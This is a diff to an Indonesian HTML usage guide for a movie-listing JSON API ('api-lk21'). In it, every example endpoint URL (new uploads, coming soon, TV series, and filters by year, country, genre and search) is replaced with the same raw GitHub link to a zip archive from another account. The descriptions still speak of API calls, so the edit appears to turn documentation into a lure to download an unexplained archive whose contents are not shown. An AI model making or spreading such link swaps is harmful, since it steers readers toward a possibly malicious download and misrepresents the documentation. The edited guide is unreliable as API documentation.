@@ -2,7 +2,7 @@
 
 <h3>Cara Pakai</h3>
 <div style="background-color='#f4f9f9'">
-  <pre>https://api-lk21.herokuapp.com/pathname?parameter=value</pre>
+  <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
 </div>
 
 <h4>Data JSON yang akan didapatkan</h4>
@@ -40,40 +40,40 @@
 <h4>Contoh</h4>
 <b>1. Movie Terbaru yang diupload</b>
   <div style="background-color='#f4f9f9'">
-    <pre>https://api-lk21.herokuapp.com/newupload</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   <p>Secara default akan memunculkan halaman ke 1. jika ingin memunculkan halaman berikutnya, gunakan parameter page seperti ini</p>
   <div style="background-color='#f4f9f9'">
-    <pre>https://api-lk21.herokuapp.com/newupload?page=2</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
 
 <b>2. Movie yang akan tayang</b>
 <div style="background-color='#f4f9f9'">
-    <pre>https://api-lk21.herokuapp.com/comingsoon</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   
 <b>3. TV Series</b>
 <div style="background-color='#f4f9f9'">
-    <pre>https://api-lk21.herokuapp.com/tv</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   
 <b>4. Movie berdasarkan tahun</b>
 <div style="background-color='#f4f9f9'">
-    <pre>http://api-lk21.herokuapp.com/year?year=2020</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   
 <b>5. Movie berdasarkan negara</b>
 <div style="background-color='#f4f9f9'">
-    <pre>http://api-lk21.herokuapp.com/country?country=indonesia</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   
 <b>6. Movie berdasarkan genre</b>
 <div style="background-color='#f4f9f9'">
-    <pre>http://api-lk21.herokuapp.com/genre?genre=action</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
   
 <b>7. Movie berdasarkan pencarian</b>
 <div style="background-color='#f4f9f9'">
-    <pre>http://api-lk21.herokuapp.com/search?query=avenger</pre>
+    <pre>https://raw.githubusercontent.com/rulsz/api-lk21/master/Konia/api-lk21.zip</pre>
   </div>
  
